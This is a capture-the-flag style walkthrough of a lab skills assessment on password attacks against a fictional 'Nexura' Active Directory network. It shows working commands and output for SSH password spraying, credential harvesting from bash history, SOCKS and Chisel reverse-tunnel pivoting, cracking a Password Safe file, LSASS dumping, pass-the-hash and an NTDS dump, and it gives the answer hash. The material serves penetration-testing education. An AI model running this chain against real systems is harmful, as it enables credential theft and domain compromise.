# Skills Assessment - Password Attacks
## The Credential Theft Shuffle
[The Credential Theft Shuffle](https://adsecurity.org/?p=2362) is a systematic approach attackers use to compromise Active Directory environments by exploiting **stolen credentials**. The process begins with gaining initial access, often through phishing, followed by obtaining local administrator privileges on a machine. Attackers then extract credentials from memory using tools like Mimikatz and leverage these credentials to **move laterally across the network**. Techniques such as pass-the-hash (PtH) and tools like NetExec facilitate this lateral movement and further credential harvesting. The ultimate goal is to escalate privileges and **gain control over the domain**, often by compromising Domain Admin accounts or performing DCSync attacks. 

## Skills Assessment
**Betty Jayde** works at **Nexura LLC**. We know she uses the password `Texas123!@#` on multiple websites, and we believe she may reuse it at work. Infiltrate Nexura's network and gain command execution on the domain controller. The following hosts are in-scope for this assessment:

<table class="table table-striped text-left">
<thead>
<tr>
<th>Host</th>
<th>IP Address</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>DMZ01</code></td>
<td><code>10.129.*.*</code> <strong>(External)</strong>, <code>172.16.119.13</code> <strong>(Internal)</strong></td>
</tr>
<tr>
<td><code>JUMP01</code></td>
<td><code>172.16.119.7</code></td>
</tr>
<tr>
<td><code>FILE01</code></td>
<td><code>172.16.119.10</code></td>
</tr>
<tr>
<td><code>DC01</code></td>
<td><code>172.16.119.11</code></td>
</tr>
</tbody>
</table>

### Pivoting Primer
The internal hosts (**JUMP01, FILE01, DC01**) reside on a private subnet that is not directly accessible from our attack host. The only externally reachable system is **DMZ01**, which has a second interface connected to the internal network. This segmentation reflects a classic DMZ setup, where public-facing services are isolated from internal infrastructure.

To access these internal systems, we must first gain a foothold on **DMZ01**. From there, we can pivot — that is, route our traffic through the compromised host into the private network. This enables our tools to communicate with internal hosts as if they were directly accessible. After compromising the DMZ, refer to the module cheatsheet for the necessary commands to set up the pivot and continue your assessment.

## Question
What is the NTLM hash of NEXURA\Administrator? **Answer: 36e09e1e6ade94d63fbcab5e5b8d6d23**

1. Discover that the target has SSH opened:
   
```sh
$ sudo nmap -Pn -sV 10.129.234.116
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-03 22:30 CST
Nmap scan report for 10.129.234.116
Host is up (0.31s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.56 seconds
```

1. Try password spraying attack with the given employee name `Betty Jayde`:
   
```sh
$ echo ../names.txt
betty jayde
$ ./username-anarchy -i ../names.txt > names.txt
$ hydra -L names.txt -p 'Texas123!@#' 10.129.234.116 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-03 23:08:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 15 tasks per 1 server, overall 15 tasks, 15 login tries (l:15/p:1), ~1 try per task
[DATA] attacking ssh://10.129.234.116:22/
[22][ssh] host: 10.129.234.116   login: jbetty   password: Texas123!@#
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-03 23:08:40
$ ssh jbetty@10.129.234.116
```

1. After successful login as `jbetty`, try to find other credential on the target → found `hwilliam`:`dealer-screwed-gym1`:
   
```sh
$ for i in $(find . -name * 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

File:  .

File:  ./.bash_logout

File:  ./.bashrc

File:  ./.cache

File:  ./.cache/motd.legal-displayed

File:  ./.local

File:  ./.local/share

File:  ./.local/share/nano

File:  ./.bash_history
sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
ssh user@192.168.0.101
scp file.txt user@192.168.0.101:~/Documents/
sudo adduser testuser
sudo usermod -aG sudo testuser
su - testuser
passwd
chown user:user script.sh

File:  ./.profile
```

3. Base on the naming convention of the target in the internal network → guess that the `FILE01` host might be a file server with SMB enabled, try simple netcat command to confirm that:

```sh
jbetty@DMZ01:~$ nc -nv 172.16.119.10 445
Connection to 172.16.119.10 445 port [tcp/*] succeeded!
```

4. Establish a SOCKS Proxy via SSH to transfer tool packets from attack host through the pivot host:

```sh
$ cat /etc/hosts

# Host addresses
172.16.119.11 DC01 DC01.nexura.htb
172.16.119.10 FILE01 FILE01.nexura.htb
172.16.119.7 JUMP01 JUMP01.nexura.htb
$ cat /etc/proxychains.conf

...SNIP...

[ProxyList]
socks5 127.0.0.1 9051
$ ssh -D 9051 jbetty@10.129.234.116
```

**(Optional) Configure Chisel with Proxychains to route our pentest tools through the DMZ01 to internal network targets:**

```sh
$ cat /etc/hosts

# Host addresses
172.16.119.11 DC01 DC01.nexura.htb
172.16.119.10 FILE01 FILE01.nexura.htb
172.16.119.7 JUMP01 JUMP01.nexura.htb
$ cat /etc/proxychains.conf

...SNIP...

[ProxyList]
socks5 127.0.0.1 1080
$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
$ gzip -d chisel_1.7.7_linux_amd64.gz
$ mv chisel_* chisel && chmod +x ./chisel
$ sudo ./chisel server --reverse 

2022/10/10 07:26:15 server: Reverse tunneling enabled
2022/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
2022/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
```

Execute Chisel on DMZ01 to connect back to our host:

```sh
jbetty@DMZ01:~$ ./chisel client 10.10.14.59:8080 R:socks
```

5. Use smbclient to probe for shares using the found credential (`hwilliam`:`dealer-screwed-gym1`) and download suspicious `.psafe3` file (a `.psafe3` file is a database used by Password Safe to store secured and encrypted user name/password list):

```sh
$ proxychains smbclient -L //172.16.119.10/ -U 'nexura.htb/hwilliam'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:9051  ...  172.16.119.10:445  ...  OK
Password for [NEXURA.HTB\hwilliam]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	HR              Disk      
	IPC$            IPC       Remote IPC
	IT              Disk      
	MANAGEMENT      Disk      
	PRIVATE         Disk      
	TRANSFER        Disk
$ proxychains smbclient //172.16.119.10/HR -U 'nexura.htb/hwilliam'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Password for [NEXURA.HTB\hwilliam]:
[proxychains] Strict chain  ...  127.0.0.1:9051  ...  172.16.119.10:445  ...  OK
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Apr 29 11:08:28 2025
  ..                                  D        0  Tue Apr 29 11:08:28 2025
  2024                                D        0  Tue Apr 29 11:08:16 2025
  2025                                D        0  Tue Apr 29 11:07:24 2025
  Archive                             D        0  Tue Apr 29 11:10:24 2025

		5056511 blocks of size 4096. 1576822 blocks available
smb: \> cd Archive
smb: \Archive\> dir
  .                                   D        0  Tue Apr 29 11:10:24 2025
  ..                                  D        0  Tue Apr 29 11:10:24 2025
  Code of Conduct_OLD.xlsx            A    29380  Tue Apr 29 11:02:27 2025
  Company presentation OLD.ppt        A   912384  Tue Apr 29 11:02:52 2025
  Covid 19 Policy.ppt                 A   912384  Tue Apr 29 11:02:52 2025
  Employee Roster 2023.xlsx           A    13246  Tue Apr 29 11:02:30 2025
  Employee-Passwords_OLD.plk          A       48  Tue Apr 29 10:13:43 2025
  Employee-Passwords_OLD.psafe3       A     1080  Tue Apr 29 10:09:57 2025
  Employee-Passwords_OLD_011.ibak      A      856  Tue Apr 29 10:10:02 2025
  Employee-Passwords_OLD_012.ibak      A      904  Tue Apr 29 10:10:04 2025
  Employee-Passwords_OLD_013.ibak      A      952  Tue Apr 29 10:10:07 2025
  Employee_handbook_2025.doc          A    26069  Tue Apr 29 11:02:39 2025
  Exit interview Questions.docx       A    34375  Tue Apr 29 11:01:34 2025
  HR Audit Guide ARCHIVE.docx         A    34375  Tue Apr 29 11:01:34 2025
  HR Budget Forecast 2026.xlsx        A    32924  Tue Apr 29 11:02:28 2025
  HR Policies and Procedures.docx      A   120515  Tue Apr 29 11:01:34 2025
  HRIS System Training.xlsx           A    29380  Tue Apr 29 11:02:27 2025
  Interview Questions Template.doc      A    32768  Tue Apr 29 11:02:38 2025
  Manager Onboarding Program.ppt      A   530432  Tue Apr 29 11:02:52 2025
  Offboarding Checklist.docx          A  1311881  Tue Apr 29 11:01:35 2025
  Offer Letter Template_OLD.docx      A   120515  Tue Apr 29 11:01:34 2025
  Password Policy OUTDATED.doc        A    32768  Tue Apr 29 11:02:38 2025
  PTO Tracking Sheet OLD.ppt          A  1028096  Tue Apr 29 11:02:49 2025
  Temporary Contractor List_OLD.xlsx      A    32924  Tue Apr 29 11:02:28 2025

		5056511 blocks of size 4096. 1576822 blocks available
smb: \Archive\> get Employee-Passwords_OLD.psafe3
getting file \Archive\Employee-Passwords_OLD.psafe3 of size 1080 as Employee-Passwords_OLD.psafe3 (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```

6. Extract password hash from the `.psafe3` file and crack it offline to obtain valid credential to open the `.psafe3` file:

```sh
$ pwsafe2john Employee-Passwords_OLD.psafe3  > pwsafe.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt pwsafe.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 262144 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
michaeljackson   (Employee-Passwords_OLD)     
1g 0:00:00:29 DONE (2026-03-04 21:13) 0.03346g/s 411.2p/s 411.2c/s 411.2C/s total90..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

7. Download the password safe file opener to read the saved password entries:

```sh
$ sudo flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo
$ sudo flatpak install flathub org.pwsafe.pwsafe -y
$ flatpak run org.pwsafe.pwsafe
```

Found credentials for these domain users:

```sh
Domain users:
bdavid caramel-cigars-reply1
stom fails-nibble-disturb4
hwilliam warned-wobble-occur8

DMZ01:
jbetty xiao-nicer-wheels5
```

8. With bdavid's credential, we can now remote to the `JUMP01` machine. The `xfreerdp` command below creates a shared folder on the target machine, which makes it easy to upload or download files:

    ```sh
    $ proxychains xfreerdp /u:bdavid /p:'caramel-cigars-reply1' /d:nexura.htb /v:172.16.119.7 /cert:ignore "/drive:sf_kalifolder,/home/htb-ac-1863259/bdavid"
    ```

    With access to an interactive graphical session on the target, we can use task manager to create a memory dump. This requires us to:

    1. Open Task Manager
    2. Select the Processes tab
    3. Find and right click the Local Security Authority Process
    4. Select Create memory dump file

    A file called `lsass.DMP` is created and saved in `%temp%`. We will transfer this file to our attack host by copying it to the shared folder `sf_kalifolder` on the machine.

9. Extract the NTLM hash from the retrieved `lsass.dmp` file using Pypykatz for user `stom`:

    ```sh
    $ pypykatz lsa minidump /home/htb-ac-1863259/bdavid/lsass.dmp

    <SNIP>
    == MSV ==
		Username: stom
		Domain: NEXUEA
		LM: NA
		NT: 21ea958524cfd9a7791737f8d2f764fa
    <SNIP> 
    ```

10. Use `netexec` with the `ntdsutil` module to dump the NTDS.dit for the Administrator's stored hash:

    ```sh
    $ proxychains netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M ntdsutil

    <SNIP>
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:36e09e1e6ade94d63fbcab5e5b8d6d23:::
    <SNIP>
    ```
